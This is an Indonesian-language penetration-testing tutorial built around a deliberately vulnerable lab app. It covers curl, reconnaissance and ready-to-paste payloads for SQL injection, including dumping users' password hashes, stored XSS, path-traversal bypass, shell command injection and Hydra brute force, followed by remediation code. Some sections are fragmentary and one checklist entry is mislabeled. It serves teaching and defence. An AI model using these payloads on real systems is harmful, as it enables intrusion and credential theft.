1.2 Anatomi perintah curl

Sebagian besar serangan di buku ini memakai curl — program pengirim request HTTP dari terminal. Mari bedah satu perintah lengkap:

curl -s -b cookies.txt -X POST "URL" -H 'content-type: application/json' -d 'BODY'
BagianArti & kapan dipakai
curlProgram untuk mengirim request HTTP (GET, POST, dll.) dari terminal.
-ssilent: sembunyikan bar progres; tampilkan hanya isi respons. Membuat output bersih untuk dibaca atau disalurkan ke jq.
-b cookies.txtbisikan cookie: kirim cookie dari berkas cookies.txt. Inilah yang membuat request "dikenali" sebagai sudah login.
-c cookies.txtcookie jar: simpan cookie yang diberikan server ke berkas itu. Dipakai saat login.
-X POSTPilih metode HTTP. GET = mengambil data; POST = mengirim data (login, membuat sesuatu).
"URL"Alamat endpoint tujuan. Selalu dalam tanda kutip agar karakter khusus aman.
-H 'header: nilai'Tambah header. content-type: application/json memberi tahu server "body saya berformat JSON".
-d 'BODY'data: isi yang dikirim (mis. JSON {"email":...}). Memakai -d otomatis membuat metode jadi POST bila -X tak diberi.

Flag tambahan yang sering muncul

FlagArti
-IMinta hanya header respons (tanpa body). Cepat untuk fingerprint server.
-GPaksa metode GET dan tempelkan data dari --data-urlencode ke URL sebagai query string.
--data-urlencode "k=v"Kirim parameter k dengan nilai v yang di-encode aman (spasi, kutip, simbol tak merusak URL).
-LIkuti redirect (3xx) ke lokasi barunya secara otomatis.
-o berkas / -OSimpan respons ke berkas (nama Anda / nama dari URL).
-w '%{http_code}'Cetak metrik setelah selesai, mis. kode status HTTP.
-kAbaikan verifikasi sertifikat TLS (untuk HTTPS self-signed). Tak perlu untuk lab di HTTP.
| jqSalurkan output ke program jq agar JSON tampil rapi & berwarna, serta bisa disaring.
Tanda \ di akhir baris berarti "perintah bersambung ke baris berikut". Anda boleh menyalin seluruh blok sekaligus; shell menganggapnya satu perintah utuh.

1.3 Jebakan tanda kutip (penting!)

Di shell, tanda kutip tunggal di dalam string kutip-tunggal akan memutus string itu. Jadi bila body -d '...' (dibungkus kutip tunggal) berisi kutip tunggal lagi di dalamnya, JSON jadi rusak dan server membalas "Body is not valid JSON".

Aturan aman: (1) hindari kutip tunggal di dalam payload; pakai nilai tanpa kutip bila bisa. (2) Bila butuh teks ber-kutip, simpan body ke berkas lalu kirim dengan -d @body.json — tak akan pernah ada masalah kutip. Kedua cara ini dipakai di bab XSS (BAB 6.2).

1.4b Dasar jq — membaca JSON

API Young Owl membalas JSON. jq membuatnya rapi & bisa disaring. Beberapa pola yang akan sering dipakai:

PerintahHasil
... | jqTampilkan seluruh JSON, rapi & berwarna.
... | jq '.data'Ambil hanya field data.
... | jq '.data[0].email'Elemen pertama array data, field email.
... | jq -r '.flag'-r (raw): cetak nilai tanpa tanda kutip — enak untuk flag.
... | jq 'keys'Daftar nama field — berguna saat belum tahu bentuk respons.
... | jq '.[] | .id'Ambil id dari setiap elemen array.
Penjelasan: titik . adalah "JSON saat ini"; .field masuk ke field; [n] memilih elemen array ke-n; [] berarti "setiap elemen". Jika jq error "Cannot index...", berarti bentuk respons berbeda — mulai dari jq (tanpa filter) untuk melihat strukturnya dulu.

1.5 Dasar HTTP yang wajib dipahami

Semua serangan web adalah percakapan HTTP: Anda mengirim request, server membalas response. Memahami bentuknya membuat setiap serangan masuk akal.

Bentuk sebuah request

POST /api/v1/auth/login HTTP/1.1        <- baris: metode, path, versi
Host: 72.62.120.97:8080                 <- header: tujuan
Content-Type: application/json          <- header: format body
Cookie: sid=abc123                      <- header: sesi login
                                        <- baris kosong memisah header & body
{"email":"intern@youngowl.lab","password":"sunshine"}   <- body
Penjelasan: saat Anda menulis curl -X POST ... -H '...' -d '...', Anda sebenarnya menyusun pesan di atas. -X = metode, -H = baris header, -d = body, -b = header Cookie. Jadi curl bukan "sihir" — ia hanya mengetik HTTP untuk Anda.

Metode HTTP yang sering dipakai

MetodeMaksudContoh di lab

POSTMengirim/membuat data./auth/login, /tools/lookup
PUT/PATCHMengubah data yang ada.update assessment
DELETEMenghapus data.hapus vulnerability
OPTIONSTanya metode apa yang diizinkan.probe CORS/metode

Kode status respons

KodeArtiKenapa penting bagi penyerang

1.6 Burp Suite — mengintip & mengulang request

Selain curl, alat kedua paling berguna adalah Burp Suite: proxy yang duduk di antara peramban dan server, sehingga Anda bisa melihat & mengubah tiap request. Alur dasarnya:

Fitur BurpGunanya
Proxy > InterceptTahan request dari peramban untuk dilihat/ubah sebelum dikirim.
HTTP historyDaftar semua request yang lewat — cara menemukan endpoint tersembunyi tanpa menebak.
RepeaterKirim ulang satu request berkali-kali sambil mengubah sedikit — ideal untuk menguji SQLi/XSS manual.
IntruderOtomatiskan variasi (mis. coba banyak id untuk IDOR, banyak payload untuk SQLi).
DecoderEncode/decode URL, Base64, dll. — berguna menyiapkan payload.
Cara memakai untuk lab: arahkan peramban ke proxy Burp (biasanya 127.0.0.1:8080 — hati-hati, ini port Burp di mesin Anda, berbeda dari port 8080 lab di 72.62.120.97), buka aplikasi lab, lalu lihat request di HTTP history. Klik kanan request login → Send to Repeater, ubah parameter, tekan Send, amati respons. Ini "curl dengan tombol" yang lebih cepat untuk eksperimen.
curl vs Burp: keduanya mengirim HTTP yang sama. Buku ini menulis contoh dalam curl karena bisa disalin apa adanya & masuk laporan; kapan pun Anda lebih suka klik, gunakan Repeater dengan isi yang sama.

Sebelum pentest sungguhan, ada kesepakatan tertulis bernama Rules of Engagement (RoE). Walau ini lab pribadi, biasakan menuliskannya — kebiasaan ini yang membedakan profesional dari sekadar iseng.

Metodologi standar (yang buku ini ikuti)

Kebanyakan pentest mengikuti kerangka seperti PTES/OWASP: (1) Pengintaian → (2) Pemindaian & pemetaan → (3) Mendapatkan akses (eksploitasi) → (4) Mempertahankan akses (post-exploitation) → (5) Analisis & pelaporan. Mengapa struktur penting: tanpa metode, pemula "menembak acak". Dengan metode, tiap temuan punya tempat, tiap langkah punya bukti, dan laporan akhir menulis dirinya sendiri dari catatan Anda.

2.4 Login & simpan sesi — WAJIB

curl -s -c cookies.txt -X POST "http://72.62.120.97:8080/api/v1/auth/login" \

Penjelasan per bagian:

BAB 3Reconnaissance & Information Gathering

Reconnaissance = mengenali target sebelum menyerang. Tujuannya menjawab: server apa, teknologi apa, endpoint apa yang ada, parameter apa yang diterima. Makin lengkap peta ini, makin terarah serangan Anda.

3.1 Fingerprint cepat dengan header respons

curl -sI http://72.62.120.97:8080/
Penjelasan tiap bagian:
  • curl — kirim request HTTP.
  • -s — silent, sembunyikan bar progres agar output bersih.
  • -I — head only: minta hanya header, bukan isi halaman. Cepat dan hemat.
  • http://72.62.120.97:8080/ — akar (root) aplikasi lab Anda.
Yang dicari: baris Server:, X-Powered-By:, dan header keamanan yang hilang (mis. tidak ada Content-Security-Policy) — ketiadaan ini sendiri sebuah temuan.

Header keamanan yang harus dicari

HeaderBila adaBila hilang
Content-Security-PolicyMembatasi sumber skrip (rem XSS).XSS lebih mudah berhasil.
X-Content-Type-Options: nosniffCegah tebakan tipe konten.Risiko MIME sniffing.
Strict-Transport-SecurityPaksa HTTPS.Rentan downgrade (di HTTP lab, wajar kosong).
Set-Cookie: ...HttpOnlyJS tak bisa baca cookie.Cookie bisa dicuri via XSS.
Catat ketiadaannya: header keamanan yang hilang adalah temuan "misconfiguration" tersendiri — masukkan ke laporan meski tak langsung menghasilkan flag.

3.1b Passive recon (tanpa menyentuh target)

Sebelum mengirim satu paket pun, penyerang mengumpulkan info dari sumber publik (OSINT): DNS, sertifikat, mesin pencari, repositori kode. Untuk lab pribadi ini porsinya kecil, tapi kebiasaannya penting.

dig +short 72.62.120.97        # info DNS balik (bila ada)
curl -s http://72.62.120.97:8080/ -o /dev/null -w '%{http_code} %{content_type}\n'
Penjelasan: dig menanyakan DNS. Baris curl kedua mencetak kode status & tipe konten tanpa menampilkan isi (-o /dev/null) — cara ultra-ringan "mengetuk" target. Passive recon mengurangi kebisingan sebelum tahap aktif.

3.2 Identifikasi teknologi: whatweb

whatweb -a 3 http://72.62.120.97:8080
Penjelasan: whatweb menebak teknologi dari pola respons. -a 3 = aggression level 3 (0–4): makin tinggi makin banyak probe dikirim, makin akurat, tapi makin "berisik" di log. Level 3 seimbang untuk lab.

3.3 Apakah ada WAF? wafw00f

wafw00f http://72.62.120.97:8080
Penjelasan: wafw00f mengirim permintaan jahil ringan lalu melihat apakah ada "tembok" (Web Application Firewall) yang memblokir. Di lab biasanya no WAF — artinya payload Anda sampai apa adanya ke aplikasi.

3.4 File petunjuk: robots.txt & sejenisnya

Penjelasan: dua berkas ini kadang menyebut path yang "tidak ingin diindeks" — justru petunjuk berharga. -s agar bersih. Tidak ada output = berkas tidak ada (tetap informasi).

3.5 Pemetaan port & versi: Nmap mendalam

-sVservice/version: tebak nama & versi layanan tiap port (mis. "Node.js http").

3.6 Menemukan endpoint tersembunyi: ffuf

Anda hanya tahu endpoint login. Bagaimana menemukan sisanya? Fuzzing: coba ribuan nama path dan lihat mana yang tidak 404.

ffuf -u http://72.62.120.97:8080/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,401,403 -t 40 -o ffuf-api.json
OpsiArti & alasan
ffufFuzz Faster U Fool: pemfuzz web cepat berbasis daftar kata.
-u ...FUZZURL target; kata FUZZ adalah titik sisip — tiap kata kamus menggantikannya.
-w .../api-endpoints.txtwordlist: daftar nama path yang dicoba (dari SecLists).
-mc 200,401,403match code: tampilkan hanya respons berkode 200/401/403. 401/403 = "ada tapi butuh login" — tetap bukti endpoint hidup.
-t 40threads: 40 permintaan paralel. Naikkan hati-hati agar lab tidak kewalahan.
-o ffuf-api.jsonSimpan hasil ke berkas JSON untuk laporan.
Apa yang Anda cari: endpoint seperti targets, assessments, files, tools, system. Itu pintu-pintu yang akan diserang di BAB 6.

3.7 Alternatif direktori: gobuster

gobuster dir -u http://72.62.120.97:8080 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -s 200,204,301,302,401,403 -b "" -t 30
Penjelasan: gobuster dir mode direktori. -s status yang ditampilkan; -b "" mengosongkan daftar status yang diabaikan agar -s yang memutuskan. -t 30 30 thread. Fungsinya mirip ffuf — gunakan yang Anda sukai.

3.8 Penemuan parameter

Sebuah endpoint seperti /targets/search menerima parameter. Menemukan nama parameter yang benar (q) penting agar SQLi (BAB 6.1) berhasil.

ffuf -u "http://72.62.120.97:8080/api/v1/targets/search?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -b "$(cat cookies.txt | grep -o 'sid.*')" -mc 200 -fs 0 -t 30
Penjelasan: di sini FUZZ ada di nama parameter. -fs 0 = filter size 0, sembunyikan respons kosong. Parameter yang mengubah ukuran respons = parameter yang "didengar" server. Untuk lab Young Owl, parameter kuncinya adalah q pada /targets/search.
Catatan sesi: endpoint ini butuh login, jadi ffuf perlu cookie. Cara paling mudah & andal untuk eksplorasi manual tetap memakai curl -b cookies.txt (BAB 2.5).

3.9 Enumerasi metode HTTP

Satu endpoint bisa menerima beberapa metode. Mengetahui metode mana yang diizinkan membuka vektor yang tak terlihat dari UI.

curl -s -X OPTIONS -i -b cookies.txt \
  "http://72.62.120.97:8080/api/v1/assessments" | grep -i allow
Penjelasan: -X OPTIONS menanyakan "metode apa yang boleh?"; -i menyertakan header respons; grep -i allow menyaring baris Allow:. Bila muncul DELETE/PUT yang tak Anda duga, catat sebagai area uji otorisasi.

6.1 SQL Injection — membaca data yang bukan milik Anda

Endpoint /api/v1/targets/search?q= menyisipkan input Anda langsung ke query SQL yang memilih 6 kolom. Dengan UNION SELECT kita tempelkan query kedua untuk membaca tabel lain.

Langkah 1 — buktikan ada injeksi

curl -s -b cookies.txt \
  "http://72.62.120.97:8080/api/v1/targets/search?q=%27" | jq
Penjelasan: %27 adalah tanda kutip tunggal ' yang di-URL-encode. Menyuntik satu kutip merusak sintaks SQL; bila server membalas pesan error database, itu bukti kuat endpoint rentan (error dibocorkan ke klien — kesalahan tersendiri).

Langkah 2 — ambil flag SQLi lewat UNION (6 kolom)

curl -s -b cookies.txt \
  "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20UNION%20SELECT%20id,name,value,hint,created_at::text,%27x%27%20FROM%20lab_flags--%20" | jq
Penjelasan payload (sudah di-encode agar aman di URL):
  • xyz' — tutup string pencarian yang asli.
  • UNION SELECT ... — gabungkan hasil dari query kedua. Harus tepat 6 kolom agar cocok.
  • id,name,value,hint,created_at::text,'x' — 6 kolom; value berisi flag. ::text mengubah tanggal jadi teks agar tipe cocok; 'x' pengisi kolom ke-6.
  • FROM lab_flags — tabel penyimpan flag.
  • -- (dengan spasi) — mengomentari sisa query asli agar tidak mengganggu.
Hasil: nilai value = YO{un10n_s3l3ct_th3_0wl}.
Skor keparahan: SQLi pembaca seluruh database = Critical (CVSS ~9.8). Alasan: tanpa hak khusus, penyerang jarak jauh bisa membaca kredensial semua pengguna — kerahasiaan runtuh total.

Langkah 3 — dump pengguna (email & hash)

curl -s -b cookies.txt \
  "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20UNION%20SELECT%20id,email,password_hash,display_name,role_id::text,is_active::text%20FROM%20users--%20" | jq
Penjelasan: sama polanya, tapi dari tabel users dengan kolom id,email,password_hash,display_name,role_id,is_active. Ini menunjukkan dampak nyata SQLi: pencurian kredensial. Di laporan, inilah bukti tingkat critical.

Memahami "mengapa 6 kolom": hitung manual dengan ORDER BY

Dari mana angka 6 berasal? Di dunia nyata Anda belum tahu jumlah kolom. Cara klasik menghitungnya adalah menaikkan ORDER BY sampai error:

curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20ORDER%20BY%205--%20" | jq
curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20ORDER%20BY%206--%20" | jq
curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20ORDER%20BY%207--%20" | jq
Penjelasan: ORDER BY N mengurutkan berdasarkan kolom ke-N. Selama N ≤ jumlah kolom, query jalan (200). Begitu N melebihi (di sini 7), server error — berarti jumlah kolom = N−1 = 6. Inilah alasan UNION kita memakai tepat 6 kolom. Teknik ini mengajarkan Anda menemukan, bukan sekadar menyalin.

6.2 Stored XSS — menyuntik skrip yang tersimpan

Endpoint yang benar adalah POST /api/v1/assessments/:id/vulnerabilities (bukan /findings). Field description dirender mentah, sehingga HTML/JS tersimpan dan berjalan saat halaman dibuka.

Jebakan tanda kutip (ingat BAB 1.3). Jangan taruh tanda kutip tunggal di dalam payload bila body dibungkus -d '...', atau Anda dapat "Body is not valid JSON".

Cara A — payload tanpa kutip (paling mudah)

curl -s -b cookies.txt -X POST \
  "http://72.62.120.97:8080/api/v1/assessments/ISI_ID_ASSESSMENT/vulnerabilities" \
  -H 'content-type: application/json' \
  -d '{"title":"xss uji","category":"xss","severity":"high","description":"<img src=x onerror=document.title=document.domain>"}'
Penjelasan tiap bagian:
  • -X POST — kita membuat data baru.
  • ISI_ID_ASSESSMENT — ganti dengan id assessment Anda (dicatat di BAB 2.5).
  • title, category, severity — field wajib menurut skema (severity atau cvssVector salah satu harus ada).
  • description — tempat payload. <img src=x onerror=...> memuat gambar yang pasti gagal, memicu onerror yang menjalankan JS — tanpa satu pun tanda kutip.
  • Payload document.title=document.domain hanya mengubah judul tab — bukti eksekusi yang aman & tidak merusak.
Bukti: buka assessment itu di peramban; judul tab berubah jadi nama domain = skrip Anda berjalan.

Cara B — body dari berkas (aman untuk payload apa pun)

cat > body.json <<'EOF'
{"title":"xss uji","category":"xss","severity":"high","description":"<img src=x onerror=document.title=document.domain>"}
EOF

curl -s -b cookies.txt -X POST \
  "http://72.62.120.97:8080/api/v1/assessments/ISI_ID_ASSESSMENT/vulnerabilities" \
  -H 'content-type: application/json' -d @body.json
Penjelasan: cat > body.json <<'EOF' ... EOF menulis JSON ke berkas apa adanya (tanda kutip 'EOF' mencegah shell mengutak-atik isinya). -d @body.json mengirim isi berkas sebagai body — jadi tanda kutip di dalam payload tak pernah bentrok dengan shell. Ini cara paling tahan banting.

6.4 Path Traversal & Command Injection (RCE)

6.4a Path traversal pada /files

Filter hanya membuang ../ sekali. Maka ....// → setelah satu pembuangan menjadi ../ dan lolos.

curl -s -b cookies.txt \
  "http://72.62.120.97:8080/api/v1/files?name=....//secret/flag.txt"
Penjelasan: name=....//secret/flag.txt — server menghapus satu ../ dari ....// menyisakan ../, lalu membaca berkas di luar folder yang dibagikan. Hasilnya FLAG_TRAVERSAL. Pelajaran: sanitasi "sekali jalan" bisa di-bypass; gunakan normalisasi path yang benar.
Skor keparahan: Path traversal baca-berkas = Medium–High (CVSS ~6.5), naik bila berkas yang terbaca berisi rahasia (konfigurasi, kunci).

6.4b Command injection (RCE) pada /tools/lookup

Field host ditaruh mentah ke perintah shell getent hosts <host>. Dengan ; kita sambungkan perintah tambahan.

# 1) buktikan eksekusi perintah
curl -s -b cookies.txt -X POST \
  "http://72.62.120.97:8080/api/v1/tools/lookup" \
  -H 'content-type: application/json' \
  -d '{"host":"x; id"}' | jq

# 2) baca flag RCE
curl -s -b cookies.txt -X POST \
  "http://72.62.120.97:8080/api/v1/tools/lookup" \
  -H 'content-type: application/json' \
  -d '{"host":"x; cat /tmp/youngowl-lab/.rce/flag"}' | jq
Penjelasan: "host":"x; id" — x membuat lookup gagal (tak masalah), lalu ; mengakhiri perintah pertama dan id dijalankan sebagai perintah kedua. Output uid=... membuktikan RCE. Perintah kedua membaca berkas flag di /tmp/youngowl-lab/.rce/flag → FLAG_RCE.
Perbaikan: jangan serahkan input ke shell; pakai API resolusi DNS bawaan bahasa, atau daftar-putih karakter & execFile dengan argumen terpisah (tanpa shell).
Skor keparahan: RCE = Critical (CVSS ~9.8). Alasan: eksekusi perintah di server adalah dampak terparah — penyerang bisa membaca berkas, mencuri rahasia, dan (tanpa isolasi) berpindah ke sistem lain. Di lab, egress yang diblokir membatasi langkah terakhir itu.

6.5 Security Misconfiguration — debug endpoint tanpa auth

curl -s http://72.62.120.97:8080/api/v1/system/debug | jq
Penjelasan: perhatikan tidak ada -b cookies.txt — endpoint ini tak butuh login (itulah celahnya). Responsnya membocorkan env termasuk DATABASE_URL dan FLAG_DEBUG. Endpoint debug yang tertinggal di produksi adalah misconfig klasik.
Perbaikan: matikan endpoint debug di produksi; jangan pernah kembalikan variabel lingkungan/secret ke klien; lindungi dengan auth & flag build.
Skor keparahan: kebocoran konfigurasi tanpa auth = High (CVSS ~7.5) — naik ke Critical bila DATABASE_URL berisi kredensial yang bisa dipakai dari luar. Perhatikan tiap field: DATABASE_URL (lokasi & kredensial DB), VULN_MODE (konfirmasi ini lab), dan flag (bukti langsung).

6.6 Authentication — enumerasi & brute force terarah

Dalam vulnMode, pesan login membedakan "email ada tapi password salah" vs "email tak ada", dan rate limit praktis dimatikan — kombinasi yang memudahkan brute force.

Enumerasi akun

curl -s -X POST "http://72.62.120.97:8080/api/v1/auth/login" \
  -H 'content-type: application/json' \
  -d '{"email":"intern@youngowl.lab","password":"salah"}'
Penjelasan: "Wrong password for this account." menegaskan email itu ada. Dengan membandingkan dua pesan, penyerang menyusun daftar email valid tanpa tahu password.

Brute force dengan Hydra (target: akun intern berpassword lemah)

hydra -l intern@youngowl.lab -P /usr/share/wordlists/rockyou.txt \
  -s 8080 72.62.120.97 http-post-form \
  "/api/v1/auth/login:{\"email\"\:\"^USER^\"\,\"password\"\:\"^PASS^\"}:Wrong password" \
  -H "Content-Type: application/json" -t 4 -f

Skor keparahan: enumerasi + brute = Medium–High (CVSS ~7.3). Enumerasi sendiri Medium (membocorkan akun valid); dikombinasikan dengan rate limit lemah & password lemah, dampaknya naik karena pengambilalihan akun jadi praktis. Lockout = kunci sementara akun/IP setelah sekian gagal.

6.7 Merangkai celah (chaining)

Serangan nyata jarang berdiri sendiri. Contoh rantai di lab ini:

  1. /system/debug (tanpa auth) → bocor konfigurasi & konfirmasi vulnMode.
  2. Brute intern → dapat sesi login.
  3. SQLi /targets/search → dump users (email & hash admin).
  4. IDOR /assessments/:id/export → baca data privat admin.
  5. RCE /tools/lookup → eksekusi perintah di server (lanjut ke BAB 7).
Mengapa penting: laporan yang menggambarkan rantai menunjukkan dampak sebenarnya — dari "satu bug kecil" menjadi "ambil alih data & server".

BAB 7Post-Exploitation (di lab) — lalu deteksi

Setelah mendapat eksekusi perintah (BAB 6.4b), post-exploitation adalah apa yang dilakukan penyerang selanjutnya. Karena berpotensi merusak, bab ini berhenti di tahap bukti konsep dan menekankan deteksi & pembersihan. Semua hanya di lab Anda yang terisolasi & auto-reset.

7.1 Orientasi: siapa & di mana saya

curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" \
  -H 'content-type: application/json' -d '{"host":"x; id; uname -a; pwd"}' | jq -r '.output'
Penjelasan: satu permintaan menjalankan tiga perintah informasi: id (user & grup), uname -a (versi kernel/OS), pwd (folder kerja). Ini langkah pertama penyerang untuk memahami lingkungan. jq -r '.output' menampilkan keluaran apa adanya.

7.2 Enumerasi lokal (membaca, tidak mengubah)

-d '{"host":"x; ls -la /tmp/youngowl-lab; cat /etc/os-release; env | head"}'
Penjelasan: hanya perintah baca: daftar berkas lab, info OS, sebagian variabel lingkungan. Tujuannya memahami apa yang bisa dijangkau — bukan mengubah apa pun.

7.3 Konsep web shell & reverse shell (tingkat tinggi)

Dua teknik umum untuk mempertahankan akses — dijelaskan secara konseptual agar Anda paham & bisa mendeteksinya, tanpa langkah senjata siap pakai:

  • Web shell — berkas yang ditanam agar bisa menerima perintah lewat HTTP. Tanda: berkas skrip baru di folder yang dapat diakses web, permintaan aneh berisi parameter perintah.
  • Reverse shell — target "menelepon balik" ke mesin penyerang untuk memberi shell interaktif. Tanda: koneksi keluar tak wajar dari server ke IP/port asing.
Batas etis buku ini. Kami sengaja tidak memberi muatan reverse shell siap jalan atau teknik menghindari antivirus/EDR. Fokusnya memahami mekanisme & cara mendeteksinya. Di lab Young Owl, egress diblokir (lihat firewall.sh), jadi reverse shell keluar tidak akan terhubung — itu memang pertahanan yang benar.

7.4 Persistence — konsep & deteksi

Persistence = cara agar akses bertahan setelah reboot. Contoh umum: cron job, service baru, kunci SSH tambahan, akun baru. Untuk lab, jangan tanam apa pun permanen — lab auto-reset dan container read-only sebagian.

Deteksi persistence: bandingkan dengan baseline — cron tak dikenal (crontab -l, /etc/cron.*), service baru, kunci di ~/.ssh/authorized_keys, akun baru di /etc/passwd, berkas dengan mtime mencurigakan.

7.5 Situational awareness (read-only)

Setelah "masuk", penyerang memetakan apa yang bisa dijangkau. Semua perintah berikut hanya membaca, dijalankan lewat celah RCE yang sudah terbukti — tujuannya memahami, bukan merusak:

Perintah (lewat field host)Apa yang diungkap
id, whoamiUser & grup proses — seberapa tinggi hak kita.
cat /etc/os-releaseDistribusi & versi OS.
ps aux | headProses yang berjalan — layanan apa saja di host.
ls -la /app 2>/dev/nullLokasi kode aplikasi (bila terjangkau).
envVariabel lingkungan — kadang berisi kredensial (temuan tersendiri).
Penjelasan: informasi ini menentukan "seberapa dalam" dampak. Jika proses berjalan sebagai root, dampaknya jauh lebih parah — itu masuk ke bagian "Dampak" laporan. Di lab, cukup buktikan Anda bisa melihatnya; tak perlu mengeksploitasi lebih jauh.

7.6 Konsep privilege escalation (deteksi)

Privilege escalation = naik dari user biasa ke root. Pemeriksaan umum (konseptual): konfigurasi sudo yang longgar, binary ber-SUID tak wajar, kernel usang. Fokus kita deteksi: pantau perubahan hak & eksekusi tak biasa.

Deteksi: audit log sudo, pantau pembuatan proses anak tak wajar dari proses web, dan bandingkan daftar SUID dengan baseline. Perubahan mendadak = sinyal.

7.7 Membersihkan

Penjelasan: pentester yang baik mengembalikan keadaan. Di lab Young Owl, cukup picu auto-reset (atau restart container) — tmpfs & seed akan memulihkan flag & data. Catat di laporan apa saja yang sempat Anda ubah.

BAB 10Panduan Perbaikan (Remediation) dengan contoh kode

Tujuan akhir pentest adalah perbaikan. Bab ini menunjukkan, per celah, mengapa kode lab rentan dan bagaimana menutupnya — dengan contoh sebelum/sesudah bergaya stack Young Owl (Fastify + Prisma + TypeScript). Pola ini universal untuk aplikasi web mana pun.

10.1 SQL Injection → prepared statement / query parameter

Sebelum (rentan)

const sql = `SELECT id, name, ... FROM targets
  WHERE name ILIKE '%${q}%' OR hostname ILIKE '%${q}%'`;
const rows = await prisma.$queryRawUnsafe(sql);   // input disambung langsung

Sesudah (aman)

const term = `%${q}%`;
const rows = await prisma.$queryRaw`
  SELECT id, name, hostname FROM targets
  WHERE name ILIKE ${term} OR hostname ILIKE ${term}`;   // nilai dikirim terpisah
// atau pakai API Prisma yang sudah aman:
const rows2 = await prisma.target.findMany({
  where: { OR: [{ name: { contains: q } }, { hostname: { contains: q } }] },
});
Mengapa aman: dengan $queryRaw (tagged template) atau API findMany, nilai q dikirim ke database sebagai parameter terpisah, bukan sebagai bagian dari teks SQL. Database memperlakukannya sebagai data murni, sehingga UNION SELECT dkk. tak pernah dieksekusi.
Kebersihan tambahan: jangan kembalikan pesan/stack error DB ke klien (tangani & log di server); beri akun DB hak paling minimal (tak perlu akses ke tabel flag dari query pencarian).

10.2 Stored XSS → encode output + Content-Security-Policy

Sebelum (rentan)

element.innerHTML = vuln.description;   // HTML mentah dirender & dieksekusi

Sesudah (aman)

element.textContent = vuln.description;  // diperlakukan sebagai teks, bukan HTML
// bila HTML memang perlu, sanitasi dulu:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(vuln.description);
// header respons (mis. via @fastify/helmet):
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
Mengapa aman: textContent menampilkan teks apa adanya sehingga <img onerror> tidak pernah menjadi elemen hidup. CSP menjadi jaring pengaman kedua: meski ada skrip nyelip, peramban menolak menjalankan skrip dari sumber tak sah. Set cookie sesi HttpOnly agar JS tak bisa mencuri cookie.

10.3 IDOR → cek otorisasi tingkat objek

Sebelum (rentan)

const a = await prisma.assessment.findUnique({ where: { id } });
return a;   // siapa pun yang login bisa ambil assessment mana pun

Sesudah (aman)

const a = await prisma.assessment.findUnique({ where: { id } });
if (!a) throw new AppError(404, 'NOT_FOUND', 'Assessment not found.');
if (a.ownerId !== req.user.id && req.user.role !== 'ADMIN') {
  throw new AppError(403, 'FORBIDDEN', 'Not your assessment.');   // cek pemilik
}
return a;
Mengapa aman: setiap akses objek diverifikasi terhadap pemilik/peran pengguna yang sedang login. Memakai id acak (UUID) menyulitkan tebakan, tetapi bukan pengganti pemeriksaan otorisasi ini — kontrol akses harus di sisi server, selalu.

10.4 Command Injection → tanpa shell + whitelist

Sebelum (rentan)

exec(`getent hosts ${host}`);   // host masuk ke shell → ";" menyambung perintah

Sesudah (aman)

import { execFile } from 'node:child_process';
import dns from 'node:dns/promises';

// opsi terbaik: pakai resolver bawaan, tanpa shell sama sekali
const addrs = await dns.lookup(host, { all: true });

// bila tetap perlu program eksternal: execFile (argumen terpisah, tanpa shell)
if (!/^[a-zA-Z0-9.-]+$/.test(host)) throw new AppError(400, 'BAD_INPUT', 'Invalid host');
execFile('getent', ['hosts', host]);   // ";" kini hanya jadi karakter biasa
Mengapa aman: dns.lookup tak menyentuh shell sama sekali. Bila program eksternal wajib, execFile mengirim argumen sebagai array terpisah sehingga ;/| tidak ditafsirkan sebagai operator shell. Validasi whitelist karakter menolak input aneh lebih awal.

10.5 Path Traversal → normalisasi & kurungan folder

Sebelum (rentan)

const cleaned = name.replace('../', '');   // hanya sekali → "....//" lolos
readFileSync(join(FILES_DIR, cleaned));

Sesudah (aman)

import path from 'node:path';
const target = path.resolve(FILES_DIR, name);
if (!target.startsWith(FILES_DIR + path.sep)) {
  throw new AppError(400, 'BAD_PATH', 'Path escapes allowed folder');   // kurungan
}
readFileSync(target);
Mengapa aman: alih-alih mencoba "membersihkan" string (selalu bisa di-bypass), path.resolve menghitung path final yang sebenarnya, lalu kita pastikan ia masih di dalam FILES_DIR. Apa pun bentuk ..//....//, jika hasilnya keluar folder, ditolak.

// debug: matikan di produksi & jangan pernah bocorkan env
if (config.NODE_ENV !== 'development') return reply.status(404).send();

// login: samakan pesan & aktifkan rate limit + lockout

IDOR

Path Traversal

Serang: GET /files?name=....//secret/flag.txt. Perbaiki: path.resolve + kurungan folder. Lulus re-test: → 400/404, bukan isi berkas.

Command Injection (RCE)

Serang: GET /system/debug tanpa login → env + flag. Perbaiki: matikan di produksi; jangan kembalikan secret. Lulus re-test: → 404 di produksi.

Serang: bandingkan pesan login; Hydra terhadap intern (penanda Wrong password). Perbaiki: pesan seragam + rate limit + lockout + MFA. Lulus re-test: pesan sama & brute terblokir.
